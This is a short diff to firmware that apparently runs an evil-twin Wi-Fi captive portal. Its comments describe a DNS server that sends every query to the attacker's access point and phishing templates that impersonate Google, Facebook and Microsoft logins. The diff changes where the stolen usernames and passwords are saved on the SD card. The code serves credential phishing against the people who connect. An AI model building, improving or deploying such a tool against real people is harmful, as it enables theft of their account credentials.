@@ -6,7 +6,7 @@
  *   2. DNS server binds to port 53, answers every query with our AP IP
  *      so the victim's phone auto-opens the portal.
  *   3. HTTP server on port 80 serves the portal HTML and captures form
- *      POSTs (/login) into /poseidon/creds.log on SD card.
+ *      POSTs (/login) into /poseidon/credentials/creds.log on SD card.
  *
  * Templates: Google, Facebook, Microsoft, Free WiFi. User picks one.
  *
@@ -209,7 +209,8 @@ static char          s_last_user[48] = {0};
 
 static void log_cred(const String &u, const String &p, const String &src)
 {
-    File f = SD.open("/poseidon/creds.log", FILE_APPEND);
+    sd_ensure_layout();
+    File f = SD.open(SD_CREDS_PATH, FILE_APPEND);
     if (!f) return;
     f.printf("%lu,%s,%s,%s,%s\n",
              (unsigned long)(millis() / 1000),
